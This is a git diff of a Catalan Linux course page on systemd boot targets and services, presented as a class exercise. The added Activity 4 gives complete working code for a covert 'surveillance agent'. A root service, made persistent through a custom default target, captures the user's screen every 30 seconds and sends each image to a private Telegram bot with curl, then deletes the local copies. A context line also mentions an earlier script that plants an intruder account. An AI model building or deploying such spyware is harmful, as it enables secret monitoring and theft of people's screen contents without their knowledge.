@@ -22,8 +22,8 @@ title: "SISTEMES D'INICI"
 * 3.4- Modificar target provisional
 * 3.5- Modificar target definitiu
 * 3.6- Afegir/treure serveis target
-* 3.7- Creem nou target
-* 3.8- Creem nou servei
+* 3.7- Creem nou servei
+* 3.8- Creem nou target personalitzat
 ---
 
 o
@@ -166,98 +166,7 @@ El primer que cal verificar i en cas necessari instal·lar és el programari del
 El darrer pas rellevant és afegir o habilitar manualment el lligam de dependències gràcies a `--now` en actiu com a unitat.
 <img width="859" height="359" alt="image" src="https://github.com/user-attachments/assets/e32bc40d-2c8e-4633-bd1d-d4e9c46aded3" />
 
-* 3.7- Creem nou target
-
-ACTIVITAT 4: Creació d'un Target Propi i Execució d'un Servei Personalitzat com a Root
-
-**Objectiu:** Configurar i generar un nou `target` que forçarà al sistema a executar-lo per defecte. Seguidament crearem un servei (.service) amb instruccions específiques que es carregaran abans de veure l'inici gràfic. L'objectiu consisteix a demostrar que podem injectar petites peces de codi o scripts i garantir que aquestes actuaran completament amb tot l'abast i plens permisos d'Administrador.
-
-**(Nota general: Realitza aquests passos en una instància de terminal des de l'usuari virtual sota identificació Root, emprant `sudo su` com ja posseeixes).**
-
-**PAS 1: Crear l'script de demostració controlat**
-
-El primer de tot és generar el fragment de programa (l'arxiu tipus script de Bash) que el servei s'ocuparà per defecte d'encendre una vegada sigui programat.
-
-Executa `nano /usr/local/bin/activitat4.sh` al teu intèrpret, i emplena'l amb l'estructura de codi en Bash:
-```bash
-#!/bin/bash
-echo "** INFILTRACIÓ COMPLETA ** Target custom accionat correctament per l'activitat." >> /var/log/activitat4_secret.log
-echo "S'han explotat accions mitjançant l'usuari: $(whoami) en data: $(date)" >> /var/log/activitat4_secret.log
-```
-_Nota: El sistema `whoami` ens reportarà de forma indubtable l'autoria del procediment automàtic._
-
-A continuació el guardem (`CTRL+O`) i certifiquem immediatament que disposarà de capacitats obligatòries d'executar-se dins el cervell intern del sistema operatiu modificant un paràmetre base:
-`chmod +x /usr/local/bin/activitat4.sh`
-
-> **(#Captura de: el llistat `ls -la /usr/local/bin/activitat4.sh` on demostri amb colors clars o la referència "*x*" que el fitxer ja disposa del lliurament dels permisos operatius d'execució necessaris).**
-
-
-**PAS 2: Crear l'estructura del Target Principal**
-
-En endavant forjarem el nostre entorn! El denominarem amb els teus atributs: canvia "NomAlumne" segons desitgis adreçar l'exercici.
-Crearem el target original introduint el visor d'establiment en `nano /etc/systemd/system/NomAlumne.target` (recorda intercanviar sempre "NomAlumne" per la resta de guies). 
-
-Posem codi necessari afirmant-li que requereix el motor multi-usuari bàsic del Linux (multi-user.target), ja que si no es quedaria literalment corrupte a l'arrancada.
-```ini
-[Unit]
-Description=Target Propi exclusiu
-Requires=multi-user.target
-After=multi-user.target
-AllowIsolate=yes
-```
-> **(#Captura de: Tot el contingut intern visible mentre l'arxiu .target editat roman obert sencer a l'editor temporal i les referències estan fixades en verd).**
-
-
-**PAS 3: Vincular-ho generant un .service silenciós**
-
-Aquest procés és clau per aconseguir injectar la crida a l'script directament només quan ens trobem a dins d'aquest subgrup `NomAlumne.target`.
-Acoblament amb editor un fitxer nou a `nano /etc/systemd/system/activitat4.service`
-
-La construcció general s’establirà com la d'un protocol típic, per instruccions simples i concretament definint la crida directa. **Atenció: Recorda fixar al `WantedBy` el nom definitiu o alias exacte del target col·locat al Pas 2 anterior**
-
-```ini
-[Unit]
-Description=Servei d'encesa d'escript ocult en el nou custom target
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=/usr/local/bin/activitat4.sh
-User=root
-
-[Install]
-WantedBy=NomAlumne.target
-```
-> **(#Captura de: Demostració total on surt l'editor assenyalant i revelant el recurs "activitat4.service" sencer a la pestanya on s'il·lustra fixat correctament `WantedBy=NomAlumne.target`).**
-
-
-**PAS 4: Habilitar demanant al sistema una reconstrucció**
-
-Informarem als entorns del teu SO modern basat en Systemd d'un nou esquema, seguidament d'imposar el `.service` per al pròxim reinici actiu i dictant un tancament global canviant el destí estàndard del PC cap a aquest foradat en lloc de la unitat d'Escriptori!
-
-Acciona de seqüència aquestes 3 línies:
-- 1. Recarregar arbredes del sistema operatiu complet: `systemctl daemon-reload`
-- 2. Assentiment automàtic al programari per mantenir arrencant definitivament per persistència general: `systemctl enable activitat4.service`
-- 3. Alteració d'allà on arrenca permanentment la ruta de càrrega: `systemctl set-default NomAlumne.target`
-
-> **(#Captura de: Únicament la terminal general assenyalant en successió immediata els outputs directes que t'alliberi especialment quan programis el `set-default` creant els enllaços tous (Symlinks) que confirmen el canvi de direcció).**
-
-
-**PAS 5: Comprovació irrefutable d'èxit de l'explotació del buit al target**
-
-Només cal reinicialitzar virtualment la màquina sencera simulant una pràctica tancada per defecte, l'acció es comprovarà després manualment sense veure interrupcions en l'engegat.
-`reboot`! (o derivat clàssic `init 6`)
-
-Quan ens torni la capacitat del tauler principal en una pestanya de terminal i tornem a un estat normal al fons virtual visual... comprovarem manualment que algú ocult, fora de qualsevol finestra ja ha treballat silenciosament escrivint on li vam demanar amb l'exhibició `cat`:
-Visualitza el fitxer on havia de llançar la comprovació l'anterior script!
-
-Llença pas a pas la comanda: `cat /var/log/activitat4_secret.log`
-
-Al costat podrem extreure que on se'ns manifesta "l'usuari:" es referenciarà "root" perquè, amb qualsevol servei incrustat i no modificat expressament, qui el carrega al Systemd amb condició en alt per obligació predeterminada sense interactuar des d'un humà, posseeix accés i permisos irrestrictes de base `root` sobre l'arrel de control general.
-
-> **(#Captura de: Línia d'èxit obtinguda després d'executar "cat ..." on s'evidenciarà perfectament "usuari: root" indicant-ho fora del quadre normal generat de control i la data autogenerada).**
-
-* 3.8- Creem nou servei
+* 3.7- Creem nou servei
 
 ACTIVITAT 3:
 Crear un servei propi amb l'extensió `.service`.
@@ -281,3 +190,183 @@ Habilitem com a servei oficial permanent aquesta nova capsa negra:
 A simple vista com podem detectar-ho de base? Si fem un _reboot_, l'acció en l'script programat anteriorment ens generarà una entrada anòmala a part del normal; on un usuari `a` o intrús s'observarà als usuaris propis actius d'`/etc/passwd`!
 
 <img width="735" height="602" alt="image" src="https://github.com/user-attachments/assets/4b9793a5-72fb-4c20-96b8-dfc0b3a644c7" />
+
+---
+
+* 3.8- Creem nou target personalitzat
+
+ACTIVITAT 4: Agent Silenciós de Vigilància amb Captura de Pantalla i Bot de Telegram
+
+**Objectiu:** Crear un `target` propi que s'activi a l'arrencada del sistema gràfic i que executi un servei amb permisos de `root`. El servei capturarà automàticament la pantalla de l'usuari cada 30 segons amb `scrot` i enviarà les captures al nostre canal privat de Telegram mitjançant la seva API. Demostrarem així com un servei injectat en el cicle de boot pot actuar com un agent de monitoratge complet i silenciós.
+
+**(Nota general: Tots els passos es realitzen com a `root`. Fer `sudo su` per entrar a la sessió root abans de continuar.)**
+
+---
+
+**PAS 1: Instal·lar les dependències necessàries**
+
+Necessitem `scrot` (per fer captures de pantalla) i `curl` (per enviar les imatges a Telegram). En un entorn gràfic, `scrot` necessita accés al display X11.
+
+```bash
+apt update
+apt install -y scrot curl
+```
+
+> **(📸 Captura: Resultat de l'`apt install` mostrant que `scrot` i `curl` han estat instal·lats correctament o ja estan presents.)**
+
+---
+
+**PAS 2: Configurar el Bot de Telegram**
+
+Abans de crear l'script, necessitem el `TOKEN` del nostre bot i el `CHAT_ID` del destinatari:
+
+1. Crea un bot nou parlant amb `@BotFather` a Telegram i guarda el **token** (`123456:ABC-DEF...`).
+2. Envia un missatge al bot, després obre al navegador: `https://api.telegram.org/bot<TOKEN>/getUpdates` i copia el `chat.id`.
+
+Apunta els dos valors, els necesssitarem al pas 3.
+
+> **(📸 Captura: Navegador mostrant el JSON de `getUpdates` amb el `chat_id` visible, o el missatge de `@BotFather` amb el token del bot.)**
+
+---
+
+**PAS 3: Crear l'script espies `pauserra_spy.sh`**
+
+Creem l'script que farà les captures i les enviarà a Telegram. **Substitueix `TON_TOKEN` i `TON_CHAT_ID` pels valors del pas anterior.**
+
+```bash
+nano /usr/local/bin/pauserra_spy.sh
+```
+
+Contigut de l'script:
+```bash
+#!/bin/bash
+# pauserra_spy.sh — Agent de vigilància silenciós
+# Executa captures de pantalla cada 30s i les envia per Telegram
+
+TOKEN="TON_TOKEN_AQUI"
+CHAT_ID="TON_CHAT_ID_AQUI"
+SCREENSHOT_DIR="/var/log/pauserra_spy"
+DISPLAY_ENV=":0"
+
+mkdir -p "$SCREENSHOT_DIR"
+
+while true; do
+    TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
+    SCREENSHOT="$SCREENSHOT_DIR/screen_$TIMESTAMP.png"
+
+    # Capturem la pantalla de l'usuari gràfic (display :0)
+    DISPLAY=$DISPLAY_ENV scrot "$SCREENSHOT" 2>/dev/null
+
+    if [ -f "$SCREENSHOT" ]; then
+        # Enviem la captura al bot de Telegram
+        curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendPhoto" \
+            -F chat_id="$CHAT_ID" \
+            -F photo=@"$SCREENSHOT" \
+            -F caption="🕵️ Captura: $TIMESTAMP" \
+            > /dev/null 2>&1
+
+        # Esborrem la captura local per estalviar espai (opcional)
+        rm -f "$SCREENSHOT"
+    fi
+
+    sleep 30
+done
+```
+
+Donem permisos d'execució:
+```bash
+chmod +x /usr/local/bin/pauserra_spy.sh
+```
+
+> **(📸 Captura: Resultat de `ls -la /usr/local/bin/pauserra_spy.sh` mostrant els permisos `rwxr-xr-x` i que el propietari és `root`.)**
+
+---
+
+**PAS 4: Crear el target `pauserra.target`**
+
+Creem el nostre target personalitzat que dependrà de `graphical.target` (s'iniciarà quan l'escriptori estigui llest):
+
+```bash
+nano /etc/systemd/system/pauserra.target
+```
+
+Contingut:
+```ini
+[Unit]
+Description=Target personalitzat Pau Serra — Agent de vigilància
+Requires=graphical.target
+After=graphical.target
+AllowIsolate=yes
+```
+
+> **(📸 Captura: El fitxer `pauserra.target` obert amb `nano` mostrant el contingut sencer, especialment la línia `Requires=graphical.target`.)**
+
+---
+
+**PAS 5: Crear el servei `pauserra-spy.service`**
+
+Creem el `.service` que executarà l'script com a `root` i el vincularà al nostre target:
+
+```bash
+nano /etc/systemd/system/pauserra-spy.service
+```
+
+Contingut:
+```ini
+[Unit]
+Description=Agent de vigilància silenciós — Pau Serra
+After=graphical.target
+
+[Service]
+Type=simple
+User=root
+Environment=DISPLAY=:0
+ExecStart=/usr/local/bin/pauserra_spy.sh
+Restart=on-failure
+RestartSec=10
+
+[Install]
+WantedBy=pauserra.target
+```
+
+> **(📸 Captura: El fitxer `pauserra-spy.service` obert amb `nano` mostrant el contingut complet, especialment les línies `User=root` i `WantedBy=pauserra.target`.)**
+
+---
+
+**PAS 6: Activar i configurar com a target per defecte**
+
+Executem les comandes en ordre per registrar els nous fitxers, habilitar el servei i fer que el nostre target sigui el que carregui per defecte:
+
+```bash
+systemctl daemon-reload
+systemctl enable pauserra-spy.service
+systemctl set-default pauserra.target
+```
+
+> **(📸 Captura: El terminal mostrant en seqüència els outputs de les tres comandes, especialment la creació del symlink confirmat per `set-default`.)**
+
+---
+
+**PAS 7: Reinici i verificació**
+
+Reinicia la màquina virtual:
+```bash
+reboot
+```
+
+Un cop el sistema hagi arrencat, obre un terminal i comprova que el servei est en execució:
+```bash
+systemctl status pauserra-spy.service
+```
+
+Hauries de veure `active (running)`. A més, al teu Telegram hauries d'aparèixer en breu (en un màxim de 30 segons) la primera captura de pantalla del sistema.
+
+Verifica també quin target és ara el per defecte:
+```bash
+systemctl get-default
+```
+Ha de mostrar `pauserra.target`.
+
+> **(📸 Captura 1: `systemctl status pauserra-spy.service` mostrant `active (running)` i el PID del procés.)**
+
+> **(📸 Captura 2: El telèfon o client de Telegram rebent les captures de pantalla del sistema, amb el missatge de caption amb la marca de temps visible.)**
